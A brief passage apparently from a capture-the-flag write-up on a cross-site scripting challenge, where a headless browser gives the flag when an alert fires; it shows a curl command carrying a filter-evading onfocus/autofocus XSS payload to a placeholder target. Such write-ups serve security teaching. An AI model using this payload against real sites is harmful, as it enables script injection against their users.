attributes). A headless PhantomJS renders the page and returns the flag only if
`alert("XSS")` fires.

   for the JS string, and `onfocus`/`autofocus`:

   ```
   curl -s -G http://<target>/page --data-urlencode 'name=<input/onfocus=alert("XS"+"S")/autofocus>'
   ```
